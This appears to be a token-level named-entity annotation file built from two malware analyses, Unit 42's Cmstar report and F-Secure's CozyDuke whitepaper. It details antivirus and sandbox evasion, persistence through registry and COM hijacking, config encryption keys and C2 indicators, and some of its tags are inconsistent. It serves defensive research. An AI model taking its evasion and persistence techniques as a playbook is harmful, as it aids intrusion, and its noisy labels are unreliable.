Cmstar	I-Entity
sample	I-Entity
specifically	O
looks	B-Action
for	O
Kaspersky	O
's	B-Entity
Anti	I-Entity
-	I-Entity
virus	I-Entity
product	I-Entity
(	I-Entity
avp.exe	I-Entity
)	I-Entity
running	I-Entity
on	I-Entity
the	I-Entity
compromised	I-Entity
system	I-Entity
.	O
If	O
the	O
Trojan	O
finds	O
processes	O
whose	O
hash	O
matches	O
the	O
three	O
values	O
mentioned	O
earlier	O
,	O
it	O
sets	O
a	O
boolean	O
value	O
(	O
the	O
character	O
'	O
1	O
'	O
)	O
within	O
the	O
data	O
sent	O
to	O
the	O
C2	O
server	O
and	O
continues	O
carrying	O
out	O
its	O
functionality	O
.	O
Rather	O
than	O
altering	O
its	O
activities	O
,	O
Cmstar	O
only	O
notifies	O
the	O
C2	O
server	O
if	O
a	O
system	O
is	O
running	O
one	O
of	O
these	O
processes	O
,	O
suggesting	O
that	O
the	O
threat	O
actors	O
might	O
employ	O
this	O
technique	O
as	O
a	O
filtering	O
mechanism	O
to	O
ignore	O
analysis	O
systems	O
and	O
researchers	O
.	O
In	O
order	O
to	O
determine	O
the	O
intrusion	O
set	O
involved	O
with	O
the	O
Cmstar	O
,	O
Unit	O
42	O
enumerated	O
infrastructure	O
used	O
by	O
the	O
downloader	O
for	O
its	O
C2	O
servers	O
.	O
The	O
related	O
infrastructure	O
chart	O
in	O
Figure	O
3	O
shows	O
a	O
rather	O
large	O
cluster	O
of	O
related	O
entities	O
with	O
one	O
small	O
set	O
of	O
entities	O
that	O
do	O
not	O
share	O
any	O
related	O
entities	O
with	O
the	O
larger	O
cluster	O
.	O
As	O
seen	O
in	O
the	O
chart	O
above	O
,	O
the	O
C2	O
domain	O
'	O
happy.launchtrue[.]com	O
'	O
was	O
originally	O
registered	O
using	O
the	O
email	O
address	O
'	O
WANGMINGHUA6@GMAIL[.]COM	O
'	O
.	O
When	O
Unit	O
42	O
used	O
the	O
Palo	O
Alto	O
Networks	O
AutoFocus	O
threat	O
intelligence	O
service	O
to	O
locate	O
additional	O
Cmstar	O
samples	O
,	O
we	O
found	O
several	O
with	O
C2	O
domains	O
that	O
also	O
had	O
the	O
same	O
original	O
registrant	O
.	O
The	O
only	O
known	O
Cmstar	O
C2	O
domain	O
not	O
initially	O
registered	O
by	O
the	O
email	O
address	O
was	O
help.ubxpi0s[.]com	O
.	O
Further	O
analysis	O
revealed	O
that	O
additional	O
domains	O
related	O
to	O
Cmstar	O
C2	O
domains	O
were	O
also	O
originally	O
registered	O
using	O
the	O
email	O
address	O
'	O
WANGMINGHUA6@GMAIL[.]COM	O
'	O
and	O
updated	O
to	O
the	O
current	O
information	O
within	O
a	O
few	O
days	O
.	O
In	O
addition	O
,	O
this	O
was	O
the	O
original	O
registrant	O
for	O
C2	O
domain	O
used	O
in	O
our	O
Google	O
Code	O
blog2	O
,	O
indicating	O
this	O
registrant	O
email	O
is	O
likely	O
a	O
re	O
-	O
seller	O
,	O
and/or	O
someone	O
who	O
initially	O
sets	O
up	O
infrastructure	O
for	O
particular	O
APT	O
threat	O
actors	O
.	O
The	O
rest	O
of	O
the	O
domains	O
related	O
to	O
the	O
Cmstar	O
infrastructure	O
did	O
not	O
use	O
the	O
original	O
registrant	O
noted	O
above	O
,	O
but	O
instead	O
kept	O
the	O
same	O
information	O
initially	O
used	O
to	O
register	O
them	O
.	O
The	O
difference	O
in	O
domain	O
registration	O
patterns	O
could	O
indicate	O
threat	O
actor	O
preference	O
,	O
or	O
could	O
indicate	O
there	O
are	O
at	O
least	O
two	O
groups	O
using	O
this	O
malware	O
whose	O
infrastructure	O
at	O
times	O
overlaps	O
.	O
Interestingly	O
,	O
the	O
updated	O
registrant	O
information	O
(	O
or	O
original	O
,	O
in	O
the	O
cases	O
where	O
it	O
was	O
n't	O
changed	O
)	O
for	O
all	O
of	O
the	O
C2	O
domains	O
in	O
this	O
blog	O
has	O
also	O
been	O
used	O
to	O
register	O
scam	O
sites	O
,	O
most	O
purporting	O
to	O
sell	O
knock	O
-	O
off	O
designer	O
products	O
like	O
shoes	O
,	O
software	O
,	O
or	O
cell	O
phones	O
.	O
The	O
contact	O
emails	O
and	O
contact	O
names	O
can	O
vary	O
,	O
but	O
the	O
address	O
is	O
re	O
-	O
used	O
.	O
Blue	O
Coat	O
noted	O
this	O
pattern	O
as	O
well	O
in	O
a	O
blog	O
published	O
late	O
last	O
year	O
,	O
which	O
also	O
noted	O
the	O
'	O
WANGMINGHUA6@GMAIL[.]COM	O
'	O
registrant	O
email.3	O
It	O
is	O
not	O
known	O
whether	O
the	O
threat	O
actors	O
conducting	O
the	O
malicious	O
activity	O
are	O
also	O
behind	O
the	O
scam	O
sites	O
.	O
The	O
Cmstar	B-Entity
tool	I-Entity
has	O
several	O
interesting	O
features	O
,	O
including	O
a	O
previously	O
unseen	O
method	O
of	O
manually	B-Action
creating	I-Action
its	B-Modifier
import	B-Entity
address	I-Entity
table	I-Entity
using	O
an	O
API	B-Entity
function	I-Entity
name	I-Entity
character	I-Entity
to	O
offset	B-Action
mapping	B-Entity
techniques	I-Entity
,	O
and	O
a	B-Entity
hashing	I-Entity
algorithm	I-Entity
used	B-Action
to	B-Modifier
find	I-Modifier
antivirus	B-Entity
processes	B-Action
on	O
an	O
infected	B-Entity
system	I-Entity
.	O
Both	O
of	O
these	O
features	O
are	O
noteworthy	O
and	O
may	O
provide	O
the	O
ability	O
to	O
correlate	O
future	O
tools	O
to	O
the	O
same	O
group	O
and/or	O
malware	O
authors	O
.	O
The	O
URL	O
used	O
by	O
Cmstar	O
to	O
communicate	O
with	O
its	O
C2	O
server	O
,	O
as	O
well	O
as	O
significant	O
infrastructure	O
overlap	O
,	O
show	O
a	O
direct	O
relationship	O
between	O
the	O
Cmstar	O
downloader	O
,	O
Lurid	O
/	O
Enfal	O
and	O
Cmwhite	O
tools	O
.	O
In	O
a	O
majority	O
of	O
the	O
cases	O
,	O
threat	O
actors	O
using	O
the	O
Cmstar	O
downloader	O
initially	O
register	O
the	O
C2	O
domains	O
using	O
the	O
email	O
address	O
'	O
WANGMINGHUA6@GMAIL[.]COM	O
'	O
and	O
later	O
change	O
the	O
registration	O
information	O
to	O
include	O
a	O
different	O
email	O
address	O
.	O
Unit	O
42	O
can	O
not	O
positively	O
confirm	O
that	O
the	O
threat	O
actors	O
control	O
the	O
'	O
WANGMINGHUA6@GMAIL[.]COM	O
'	O
email	O
address	O
,	O
or	O
if	O
the	O
email	O
address	O
belongs	O
to	O
a	O
reseller	O
that	O
the	O
threat	O
actors	O
buy	O
domains	O
from	O
to	O
create	O
their	O
infrastructure	O
;	O
however	O
,	O
we	O
do	O
believe	O
this	O
is	O
an	O
interesting	O
TTP	O
worth	O
tracking	O
in	O
future	O
infrastructure	O
enumeration	O
.	O
TLP	O
:	O
WHITE	O
This	O
whitepaper	O
provides	O
an	O
overview	O
of	O
CozyDuke	O
,	O
a	O
set	O
of	O
tools	O
used	O
by	O
one	O
or	O
more	O
malicious	O
actors	O
for	O
performing	O
targeted	O
attacks	O
against	O
high	O
profile	O
organizations	O
,	O
such	O
as	O
governmental	O
organizations	O
and	O
other	O
entities	O
that	O
work	O
closely	O
with	O
these	O
institutions	O
.	O
The	O
CozyDuke	B-Entity
toolset	I-Entity
,	O
which	O
we	O
believe	O
has	O
been	O
under	O
active	O
development	O
since	O
at	O
least	O
2011	O
,	O
consists	O
of	O
tools	O
for	O
infecting	O
targeted	O
hosts	O
,	O
establishing	B-Action
and	I-Action
maintaining	I-Action
backdoor	O
access	O
to	O
the	O
hosts	O
,	O
gathering	B-Action
information	B-Entity
from	B-Modifier
them	B-Entity
and	O
gaining	O
further	O
access	B-Action
to	B-Modifier
other	B-Entity
hosts	I-Entity
inside	I-Entity
the	I-Entity
victim	I-Entity
organization	I-Entity
.	O
Based	O
on	O
command	O
and	O
control	O
(	O
C&C	O
)	O
server	O
information	O
found	O
being	O
used	O
by	O
CozyDuke	O
tools	O
,	O
we	O
believe	O
the	O
CozyDuke	O
toolset	O
is	O
used	O
by	O
at	O
least	O
one	O
malicious	O
actor	O
who	O
also	O
uses	O
,	O
or	O
at	O
the	O
least	O
shares	O
,	O
infrastructure	O
with	O
actors	O
using	O
the	O
known	O
threats	O
,	O
MiniDuke	O
and	O
OnionDuke	O
.	O
F	O
-	O
SECURE	O
LABS	O
SECURITY	O
RESPONSE	O
Malware	O
analysis	O
Whitepaper	O
CozyDuke	O
,	O
as	O
referred	O
to	O
in	O
this	O
document	O
,	O
is	O
a	O
set	O
of	O
tools	O
used	O
by	O
one	O
or	O
more	O
malicious	O
actors	O
for	O
performing	O
targeted	O
attacks	O
against	O
high	O
profile	O
organizations	O
.	O
The	O
core	O
of	O
the	O
CozyDuke	O
toolset	O
is	O
a	O
modular	O
attack	O
platform	O
consisting	O
of	O
a	O
main	O
component	O
augmented	O
by	O
a	O
set	O
of	O
additional	O
modules	O
implementing	O
further	O
functionality	O
.	O
The	O
CozyDuke	O
toolset	O
also	O
includes	B-Action
multiple	B-Entity
kinds	I-Entity
of	I-Entity
droppers	I-Entity
for	B-Modifier
infecting	O
hosts	B-Entity
with	B-Modifier
CozyDuke	B-Entity
or	O
for	O
executing	O
additional	O
tools	O
from	O
the	O
CozyDuke	B-Entity
toolset	I-Entity
.	O
Finally	O
,	O
the	B-Entity
CozyDuke	I-Entity
toolset	I-Entity
includes	O
tools	O
and	O
scripts	O
–	O
some	O
custom	O
-	O
written	O
,	O
others	O
based	O
on	O
openly	O
available	O
tools	O
–	O
that	O
are	O
used	O
for	O
purposes	O
such	O
as	O
gathering	O
further	O
information	O
from	O
infected	O
hosts	O
or	O
for	B-Modifier
infecting	O
additional	B-Action
hosts	B-Entity
in	I-Entity
the	I-Entity
same	I-Entity
target	I-Entity
organization	I-Entity
.	O
We	O
have	O
observed	O
CozyDuke	O
being	O
spread	B-Action
via	B-Modifier
email	B-Entity
,	O
which	O
usually	O
contain	O
a	O
link	O
to	O
a	O
compromised	O
website	O
hosting	O
a	O
ZIP	O
file	O
(	O
although	O
in	O
at	O
least	O
one	O
case	O
,	O
the	O
file	O
was	O
hosted	O
on	O
Dropbox	O
)	O
.	O
These	O
files	O
contain	O
an	B-Entity
executable	I-Entity
that	O
,	O
upon	O
execution	O
,	O
will	O
write	B-Action
to	B-Modifier
disk	B-Entity
and	O
execute	B-Action
CozyDuke	B-Entity
,	O
while	O
at	O
the	O
same	O
time	O
presenting	O
the	O
user	O
with	O
a	O
decoy	O
to	O
divert	O
attention	O
.	O
The	O
decoy	O
is	O
usually	O
an	O
uninteresting	O
PDF	O
,	O
but	O
we	O
have	O
also	O
observed	O
a	O
Flash	O
video	O
of	O
monkeys	O
being	O
presented	O
as	O
the	O
decoy	O
.	O
We	O
have	O
reason	O
to	O
believe	O
CozyDuke	O
is	O
being	O
used	O
to	O
target	O
governmental	O
organizations	O
and	O
entities	O
that	O
work	O
closely	O
with	O
such	O
bodies	O
.	O
We	O
believe	O
the	O
current	O
CozyDuke	O
activity	O
started	O
at	O
the	O
end	O
of	O
January	O
2015	O
.	O
Most	O
of	O
the	O
samples	O
we	O
have	O
observed	O
were	O
compiled	O
beginning	O
from	O
the	O
end	O
of	O
January	O
.	O
However	O
,	O
based	O
on	O
comparisons	O
of	O
recent	O
CozyDuke	O
samples	O
against	O
older	O
samples	O
we	O
have	O
obtained	O
dating	O
back	O
as	O
far	O
as	O
the	O
end	O
of	O
2011	O
,	O
we	O
believe	O
CozyDuke	O
has	O
been	O
under	O
active	O
development	O
since	O
at	O
least	O
2011	O
.	O
We	O
have	O
strong	O
evidence	O
suggesting	O
the	O
group	O
using	O
CozyDuke	O
is	O
the	O
same	O
as	O
-	O
or	O
at	O
the	O
least	O
shares	O
command	O
and	O
control	O
infrastructure	O
with	O
-	O
the	O
group	O
or	O
groups	O
using	O
MiniDuke	O
and	O
OnionDuke	O
.	O
Firstly	O
,	O
a	O
CozyDuke	O
sample	O
from	O
February	O
of	O
2012	O
attempts	O
to	O
contact	O
a	O
C&C	O
server	O
at	O
nostressjob.com	O
.	O
This	O
domain	O
has	O
previously	O
been	O
associated	O
with	O
known	O
MiniDuke	O
C&C	O
infrastructure	O
.	O
This	O
same	O
infrastructure	O
has	O
also	O
been	O
seen	O
in	O
use	O
by	O
OnionDuke	O
.	O
Secondly	O
,	O
we	O
also	O
have	O
reason	O
to	O
believe	O
CozyDuke	O
has	O
,	O
in	O
some	O
instances	O
,	O
downloaded	O
and	O
executed	O
droppers	B-Action
for	B-Entity
DLL	I-Entity
files	I-Entity
reminiscent	I-Entity
of	I-Entity
OnionDuke	I-Entity
.	O
Specifically	O
,	O
the	O
DLLs	O
dropped	O
have	O
used	O
file	O
and	O
export	O
names	O
also	O
used	O
by	O
OnionDuke	O
.	O
Additionally	O
,	O
the	O
strings	O
in	O
the	O
DLLs	O
have	O
been	O
encrypted	O
using	O
the	O
same	O
algorithm	O
used	O
by	O
OnionDuke	O
.	O
This	O
link	O
is	O
,	O
however	O
,	O
not	O
as	O
conclusive	O
as	O
the	O
infrastructure	O
overlap	O
.	O
Infection	O
with	O
CozyDuke	O
begins	O
with	O
the	O
victim	O
receiving	O
an	O
email	O
containing	O
a	O
link	O
to	O
a	O
ZIP	O
file	O
.	O
This	O
ZIP	O
file	O
will	O
contain	O
a	O
single	O
executable	O
,	O
usually	O
a	O
self	O
-	O
extracting	O
RAR	O
archive	O
.	O
Upon	O
execution	O
,	O
it	B-Entity
will	O
write	O
two	O
files	B-Entity
to	B-Modifier
disk	B-Entity
.	O
The	O
first	O
file	O
is	O
a	O
decoy	O
.	O
The	O
decoy	O
has	O
usually	O
been	O
a	O
PDF	O
document	O
but	O
Flash	O
videos	O
have	O
also	O
been	O
observed	O
in	O
some	O
cases	O
.	O
The	O
second	O
file	O
extracted	O
from	O
the	O
archive	O
is	O
a	O
CozyDuke	O
dropper	O
.	O
This	O
dropper	O
will	O
then	O
proceed	O
to	O
write	B-Action
to	B-Modifier
disk	B-Entity
the	O
main	B-Entity
CozyDuke	I-Entity
components	I-Entity
as	O
well	O
as	O
an	O
encrypted	B-Entity
configuration	I-Entity
file	I-Entity
used	I-Entity
by	I-Entity
CozyDuke	I-Entity
.	O
The	O
main	B-Entity
CozyDuke	I-Entity
dropper	I-Entity
,	O
used	O
for	O
infecting	O
hosts	O
with	O
CozyDuke	O
,	O
begins	O
by	O
checking	B-Action
whether	O
the	O
victim	B-Entity
has	I-Entity
an	I-Entity
anti	I-Entity
-	I-Entity
virus	I-Entity
product	I-Entity
installed	I-Entity
.	O
Should	O
an	O
installed	O
product	O
be	O
found	O
,	O
it	B-Entity
will	O
be	O
compared	O
to	O
a	O
predetermined	O
list	O
of	O
product	O
names	O
.	O
If	O
the	O
installed	O
product	O
matches	O
a	O
name	O
on	O
the	O
list	O
,	O
the	O
dropper	O
will	O
immediately	O
exit	O
.	O
Newer	O
versions	B-Entity
of	I-Entity
the	I-Entity
dropper	I-Entity
will	O
perform	O
additional	O
checks	O
to	O
ensure	O
the	O
dropper	B-Entity
is	I-Entity
not	I-Entity
being	I-Entity
executed	I-Entity
inside	O
a	O
virtual	B-Entity
machine	I-Entity
or	O
a	B-Entity
known	I-Entity
malware	I-Entity
analysis	I-Entity
sandbox	I-Entity
environment	I-Entity
.	O
Should	O
either	O
of	O
these	O
checks	O
fail	O
,	O
the	O
dropper	O
will	O
likewise	O
exit	O
immediately	O
.	O
Next	O
,	O
the	O
dropper	O
will	O
find	O
and	O
decrypt	O
encrypted	O
data	O
stored	O
as	O
two	O
PE	O
resources	O
embedded	O
in	O
the	O
executable	O
.	O
These	O
resources	O
are	O
named	O
with	O
the	O
hexadecimal	O
identifiers	O
0x000A	O
and	O
0x000B.	O
Both	O
resources	O
are	O
structured	O
similarily	O
.	O
They	O
begin	O
with	O
a	O
four	O
-	O
byte	O
value	O
specifying	O
the	O
length	O
of	O
the	O
included	O
decryption	O
key	O
.	O
This	O
decryption	O
key	O
immediately	O
follows	O
the	O
length	O
field	O
.	O
Finally	O
,	O
the	O
rest	O
of	O
the	O
resource	O
is	O
the	O
encrypted	O
payload	O
.	O
The	O
encryption	O
used	O
is	O
a	O
simple	O
XOR	O
with	O
a	O
rotating	O
key	O
.	O
The	O
first	O
resource	O
,	O
0x000A	O
,	O
contains	O
as	O
its	O
payload	O
a	O
Microsoft	O
cabinet	O
archive	O
.	O
This	O
archive	O
contains	O
the	O
CozyDuke	O
components	O
that	O
the	O
dropper	O
will	O
later	O
install	O
on	O
the	O
victim	O
system	O
.	O
The	O
second	O
resource	O
,	O
0x000B	O
,	O
contains	O
as	O
its	O
payload	O
an	O
XML	O
file	O
with	O
instructions	O
for	O
the	O
dropper	O
on	O
where	O
to	O
install	O
the	O
dropped	O
components	O
and	O
what	O
to	O
name	O
them	O
.	O
The	O
dropper	O
will	O
then	O
proceed	O
to	O
write	O
the	O
CozyDuke	B-Entity
components	I-Entity
to	B-Modifier
the	O
specified	B-Entity
location	I-Entity
.	O
The	O
dropper	O
will	O
additionally	O
copy	O
the	O
system	B-Entity
file	I-Entity
rundll32.exe	B-Action
to	B-Modifier
the	O
install	B-Entity
location	I-Entity
for	I-Entity
CozyDuke	I-Entity
.	O
This	O
file	O
will	O
also	O
use	O
a	O
name	O
specified	O
in	O
the	O
droppers	O
configuration	O
file	O
.	O
Finally	O
,	O
the	B-Entity
dropper	I-Entity
will	O
use	O
the	O
copy	B-Entity
of	I-Entity
rundll32.exe	I-Entity
to	B-Modifier
load	I-Modifier
and	O
execute	I-Entity
the	I-Entity
CozyDuke	I-Entity
main	I-Entity
component	I-Entity
.	O
The	O
main	O
component	O
of	O
CozyDuke	O
is	O
a	O
DLL	O
file	O
responsible	O
for	O
orchestrating	O
all	O
of	O
CozyDuke	O
's	O
activity	O
on	O
a	O
victim	O
machine	O
.	O
The	O
main	B-Entity
component	I-Entity
is	O
executed	O
by	O
the	B-Entity
CozyDuke	I-Entity
dropper	I-Entity
using	O
a	O
copy	B-Entity
of	I-Entity
rundll32.exe	I-Entity
.	O
The	O
entrypoint	O
function	O
varies	O
,	O
but	O
is	O
always	O
specified	O
in	O
the	O
dropper	O
configuration	O
.	O
The	O
most	B-Entity
important	I-Entity
functionalities	I-Entity
offered	O
by	O
the	O
main	O
component	O
BE	O
BE	O
BE	O
are	O
establishment	B-Action
of	B-Entity
persistence	I-Entity
,	O
gathering	B-Entity
of	I-Entity
basic	I-Entity
system	I-Entity
information	I-Entity
,	O
communication	B-Entity
with	I-Entity
the	I-Entity
C&C	I-Entity
server	I-Entity
and	O
the	B-Entity
execution	I-Entity
of	I-Entity
additional	I-Entity
tasks	I-Entity
,	I-Entity
modules	I-Entity
or	I-Entity
executables	I-Entity
as	O
commanded	B-Action
by	B-Entity
the	I-Entity
C&C	I-Entity
server	I-Entity
.	O
CozyDuke	O
may	O
use	O
multiple	O
techniques	O
for	O
establishing	O
persistence	O
;	O
the	O
following	O
is	O
one	O
technique	O
used	O
.	O
Firstly	O
,	O
CozyDuke	O
may	O
set	B-Action
itself	B-Entity
to	O
be	O
executed	B-Entity
at	I-Entity
system	I-Entity
startup	I-Entity
by	O
adding	O
a	O
registry	B-Entity
value	I-Entity
under	O
any	O
of	O
the	O
following	O
registry	O
keys	O
:	O
The	O
name	O
of	O
the	O
registry	O
value	O
will	O
usually	O
be	O
the	O
filename	O
,	O
(	O
without	O
the	O
extension	O
)	O
of	O
the	O
CozyDuke	O
main	O
component	O
.	O
CozyDuke	O
may	O
also	O
register	O
itself	O
B	O
as	O
a	O
Windows	B-Entity
service	I-Entity
or	O
scheduled	B-Entity
task	I-Entity
.	O
Additionally	O
,	O
CozyDuke	O
may	O
utilize	O
a	O
technique	O
known	O
as	O
COM	O
-	O
object	O
hijacking	O
[	O
1	O
]	O
to	O
establish	O
persistence	O
.	O
To	O
achieve	O
this	O
,	O
CozyDuke	O
will	O
"	B-Action
hijack	I-Action
"	O
the	O
registry	B-Entity
entries	I-Entity
for	I-Entity
the	I-Entity
COM	I-Entity
object	I-Entity
"	I-Entity
SharedTaskScheduler	I-Entity
"	I-Entity
.	O
CozyDuke	O
will	O
modify	O
the	O
registry	B-Entity
entries	I-Entity
in	O
such	O
a	O
way	O
that	O
any	O
loading	O
of	O
the	O
SharedTaskScheduler	O
COM	O
object	O
will	O
first	O
load	O
a	O
special	O
CozyDuke	O
module	O
that	O
will	O
ensure	B-Entity
CozyDuke	I-Entity
stays	I-Entity
active	I-Entity
on	I-Entity
the	I-Entity
victim	I-Entity
host	I-Entity
.	O
The	O
configuration	O
data	O
for	O
CozyDuke	O
is	O
stored	O
as	O
a	O
separate	O
RC4-encrypted	O
file	O
that	O
is	O
written	O
to	O
disk	O
by	O
the	O
CozyDuke	O
dropper	O
during	O
initial	O
infection	O
.	O
The	O
name	O
of	O
the	O
encrypted	O
configuration	O
file	O
on	O
disk	O
has	O
been	O
racss	O
.	O
dat	O
in	O
all	O
of	O
the	O
observed	O
cases	O
.	O
The	O
decrypted	O
file	O
is	O
formatted	O
as	O
XML	O
with	O
the	O
UTF-16LE	O
character	O
encoding	O
.	O
In	O
all	O
CozyDuke	O
samples	O
from	O
2015	O
,	O
the	O
configuration	O
data	O
has	O
been	O
encrypted	O
with	O
the	O
RC4	O
key	O
B5	O
78	O
62	O
52	O
98	O
3E	O
24	O
D7	O
3B	O
C6	O
EE	O
7C	O
B9	O
ED	O
91	O
62	O
.	O
In	O
CozyDuke	O
samples	O
from	O
July	O
of	O
2014	O
,	O
the	O
RC4	O
key	O
has	O
been	O
embedded	O
in	O
the	O
encrypted	O
configuration	O
file	O
.	O
In	O
this	O
case	O
,	O
the	O
encrypted	O
configuration	O
file	O
will	O
begin	O
with	O
a	O
4-byte	O
value	O
specifying	O
the	O
length	O
of	O
the	O
included	O
RC4	O
key	O
.	O
This	O
will	O
be	O
followed	O
by	O
the	O
actual	O
key	O
.	O
Finally	O
,	O
the	O
rest	O
of	O
the	O
file	O
will	O
be	O
the	O
actual	O
configuration	O
data	O
.	O
CozyDuke	O
's	O
main	O
method	O
of	O
communicating	B-Action
with	B-Modifier
its	B-Entity
command	I-Entity
and	I-Entity
control	I-Entity
server	I-Entity
is	B-Action
using	O
either	O
HTTP	B-Entity
or	I-Entity
HTTPS	I-Entity
.	O
The	O
method	O
of	O
communication	O
,	O
as	O
well	O
as	O
the	O
address	O
to	O
connect	O
to	O
,	O
are	O
specified	O
in	O
CozyDuke	O
's	O
configuration	O
data	O
.	O
In	O
the	O
cases	O
we	O
have	O
observed	O
,	O
the	B-Entity
configuration	I-Entity
data	I-Entity
for	I-Entity
any	I-Entity
single	I-Entity
CozyDuke	I-Entity
instance	I-Entity
has	O
included	O
the	O
details	B-Entity
of	I-Entity
either	I-Entity
one	I-Entity
or	I-Entity
two	I-Entity
C&C	I-Entity
servers	I-Entity
.	O
Listed	O
above	O
are	O
details	O
of	O
known	O
CozyDuke	O
C&C	O
servers	O
.	O
We	O
believe	O
all	O
of	O
the	O
ones	O
listed	O
are	O
compromised	O
servers	O
.	O
In	O
addition	O
to	O
its	O
main	O
communication	O
method	O
,	O
CozyDuke	O
also	O
features	O
the	O
ability	O
to	O
use	O
Twitter	O
as	O
a	O
backup	O
C&C	O
channel	O
.	O
In	O
cases	O
where	O
CozyDuke	O
utilizes	O
this	O
functionality	O
,	O
the	O
twitter	O
account	O
to	O
be	O
used	O
will	O
be	O
specified	O
in	O
CozyDuke	O
's	O
configuration	O
data	O
.	O
We	O
have	O
only	O
observed	O
two	O
samples	O
where	O
a	O
backup	O
Twitter	O
account	O
was	O
actually	O
specified	O
in	O
the	O
configuration	O
data	O
.	O
These	O
accounts	O
were	O
@US2515	O
and	O
@monkey_drive	O
.	O
Tasks	O
CozyDuke	B-Entity
's	I-Entity
primary	I-Entity
purpose	I-Entity
is	O
the	O
execution	B-Entity
of	I-Entity
tasks	I-Entity
.	O
These	O
tasks	O
usually	O
involve	O
the	O
execution	B-Entity
of	I-Entity
modules	I-Entity
or	I-Entity
executables	I-Entity
providing	I-Entity
additional	I-Entity
functionality	I-Entity
.	O
The	O
main	O
difference	O
between	O
the	O
two	O
is	O
that	O
modules	O
are	O
DLL	O
files	O
loaded	O
in	O
memory	O
by	O
the	O
CozyDuke	O
main	O
component	O
,	O
whereas	O
executables	O
are	O
PE	O
executable	O
files	O
that	O
CozyDuke	O
will	O
write	O
to	O
disk	O
and	O
execute	O
.	O
For	O
the	O
purpose	O
of	O
managing	O
tasks	O
,	O
the	B-Entity
main	I-Entity
component	I-Entity
of	I-Entity
CozyDuke	I-Entity
implements	O
6	B-Action
commands	B-Entity
that	I-Entity
the	I-Entity
C&C	I-Entity
server	I-Entity
can	I-Entity
specify	I-Entity
.	O
These	O
commands	O
are	O
briefly	O
described	O
in	O
Table	O
2	O
(	O
overleaf	O
)	O
.	O
The	O
following	O
chapter	O
,	O
CozyDuke	O
Tasks	O
,	O
provides	O
further	O
information	O
on	O
the	O
tasks	O
CozyDuke	O
has	O
been	O
observed	O
executing	O
.	O
Based	O
on	O
samples	O
obtained	O
from	O
our	O
own	O
collections	O
and	O
generously	O
shared	O
to	O
us	O
by	O
a	O
trusted	O
source	O
,	O
we	O
have	O
been	O
able	O
to	O
identify	O
some	O
of	O
the	O
tasks	O
executed	O
recently	O
by	O
CozyDuke	O
.	O
These	O
tasks	O
can	O
be	O
divided	O
into	O
two	O
categories	O
.	O
The	O
first	O
consists	O
of	O
CozyDuke	B-Entity
modules	I-Entity
which	O
are	O
DLL	O
files	O
loaded	O
in	O
memory	O
by	O
the	O
main	O
component	O
of	O
CozyDuke	O
for	O
the	O
purposes	O
of	O
extending	O
CozyDuke	O
's	B-Entity
functionality	I-Entity
.	O
The	O
second	O
category	O
consists	O
of	O
PE	B-Entity
executable	I-Entity
files	I-Entity
that	O
CozyDuke	O
will	O
write	B-Action
to	B-Modifier
disk	B-Entity
and	O
execute	B-Action
on	O
the	O
infected	B-Entity
host	I-Entity
.	O
These	O
executables	O
are	O
usually	O
droppers	O
similar	O
to	O
those	O
used	O
to	O
infect	O
a	O
host	O
with	O
CozyDuke	O
.	O
In	O
this	O
case	O
,	O
however	O
,	O
instead	O
of	O
dropping	O
CozyDuke	O
,	O
the	B-Entity
executables	I-Entity
may	O
drop	B-Action
other	B-Entity
executables	I-Entity
,	I-Entity
scripts	I-Entity
or	I-Entity
DLLs	I-Entity
.	O
Once	O
executed	O
by	O
CozyDuke	O
,	O
these	O
executables	O
function	O
independently	O
of	O
CozyDuke	O
's	O
main	O
component	O
.	O
Listed	O
below	O
are	O
the	O
modules	O
we	O
have	O
observed	O
being	O
used	O
:	O
We	O
have	O
observed	O
executables	O
executed	O
by	O
CozyDuke	O
for	O
the	O
following	O
purposes	O
.	O
These	O
executables	O
will	O
implement	O
their	O
own	O
methods	O
of	O
C&C	O
communication	O
and	O
data	O
exfiltration	O
.	O
In	O
many	O
cases	O
,	O
the	O
scripts	O
utilized	O
Microsoft	O
OneDrive	O
accounts	O
for	O
data	O
transfer	O
.	O
The	O
earliest	O
CozyDuke	O
sample	O
we	O
have	O
observed	O
so	O
far	O
was	O
compiled	O
on	O
the	O
29th	O
of	O
December	O
,	O
2011	O
.	O
The	O
sample	O
in	O
question	O
was	O
not	O
an	O
actual	O
CozyDuke	O
main	O
component	O
,	O
but	O
a	O
CozyDuke	O
module	O
.	O
The	O
earliest	O
main	O
component	O
we	O
observed	O
was	O
compiled	O
on	O
the	O
29th	O
of	O
February	O
,	O
2012	O
.	O
The	O
main	O
component	O
in	O
question	O
stores	O
its	O
strings	O
and	O
configuration	O
in	O
an	O
unencrypted	O
form	O
.	O
Additionally	O
,	O
the	O
configuration	O
is	O
stored	O
embedded	O
in	O
the	O
binary	O
,	O
not	O
as	O
a	O
separate	O
XML	O
file	O
in	O
the	O
manner	O
of	O
newer	O
CozyDuke	O
versions	O
.	O
Even	O
this	O
oldest	O
main	O
component	O
does	O
however	O
use	O
XML	O
for	O
other	O
purposes	O
via	O
the	O
open	O
-	O
source	O
Pugi	O
-	O
XML	O
library	O
.	O
The	O
next	O
CozyDuke	O
main	O
component	O
we	O
observed	O
was	O
compiled	O
on	O
the	O
30th	O
of	O
November	O
,	O
2012	O
.	O
By	O
then	O
,	O
the	O
authors	O
had	O
switched	O
to	O
encrypting	O
the	O
strings	O
and	O
the	O
configuration	O
.	O
However	O
,	O
the	O
configuration	O
was	O
still	O
stored	O
embedded	O
in	O
the	O
binary	O
.	O
Design	O
-	O
wise	O
,	O
this	O
sample	O
is	O
a	O
bit	O
of	O
an	O
outlier	O
.	O
Instead	O
of	O
being	O
a	O
DLL	O
file	O
,	O
the	O
main	O
component	O
is	O
actually	O
an	O
EXE	O
that	O
,	O
in	O
addition	O
to	O
the	O
configuration	O
,	O
embeds	O
multiple	O
DLLs	O
that	O
provide	O
additional	O
functionality	O
to	O
the	O
main	O
component	O
.	O
Apart	O
from	O
the	O
different	O
design	O
,	O
functionally	O
the	O
main	O
component	O
is	O
very	O
similar	O
to	O
other	O
CozyDuke	O
main	O
components	O
.	O
It	O
is	O
possible	O
the	O
authors	O
of	O
CozyDuke	O
were	O
trying	O
out	O
a	O
new	O
design	O
,	O
but	O
eventually	O
decided	O
to	O
go	O
back	O
to	O
the	O
original	O
.	O
The	O
next	O
CozyDuke	O
main	O
component	O
we	O
observed	O
,	O
compiled	O
on	O
the	O
2nd	O
of	O
July	O
,	O
2014	O
,	O
is	O
again	O
a	O
DLL	O
file	O
.	O
By	O
now	O
,	O
the	O
authors	O
of	O
CozyDuke	O
had	O
switched	O
from	O
an	O
embedded	O
configuration	O
to	O
the	O
external	O
XML-	O
formatted	O
configuration	O
file	O
seen	O
today	O
.	O
We	O
have	O
yet	O
to	O
observe	O
samples	O
